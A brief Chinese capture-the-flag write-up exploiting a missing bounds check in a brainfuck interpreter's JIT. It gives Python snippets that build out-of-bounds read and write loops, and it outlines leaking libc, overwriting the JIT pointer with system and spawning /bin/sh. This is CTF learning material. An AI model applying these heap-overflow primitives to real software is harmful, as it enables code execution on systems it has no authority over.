# 最强大脑

brainfuck的二进制解释器，在`[]`内的代码运行超过0xf次后，会生成jit代码，而jit代码缺失边界检查，所以生成jit后可以进行堆的前向和后向溢出。

我觉得这道题构造的时候比较难想的一点是在越界读写的时候怎么让bf的循环停下来，因为bf的`[]`循环的停止条件是当前指针指向的值是否是0，而如果我想越界读写的话，必然要把指针向前/向后移动，而堆里面的0非常多，为了让循环继续，只好修改当前0内存的值为非0，这样堆内存受到了破坏，就难免出现堆的报错。所以构造了以下两个小case，在恢复当前内存的值后再将指针向前/向后移动，可以做到在某特定字节后停止读写。

读到某特定字节停止：

```
findchr=0x80
code+=b"+"*(0x100-findchr)
print(len(code))
code+=b"["
code+=b"-"*(0x100-findchr)
code+=b"<."
code+=b"+"*(0x100-findchr)
code+=b"]"
```

写到某字节停止：

```
eof=0x0d
code+=b"+"*(0x100-eof)
code+=b"["
code+=b"-"*(0x100-eof)
code+=b">.," 
code+=b"+"*(0x100-eof)
code+=b"]"
```

越界读泄露libc，越界写覆盖jit的地址为system，此时的rdi正好是bf的栈，在栈上布置好/bin/sh拿shell。

这题拿了一血，就还挺开心。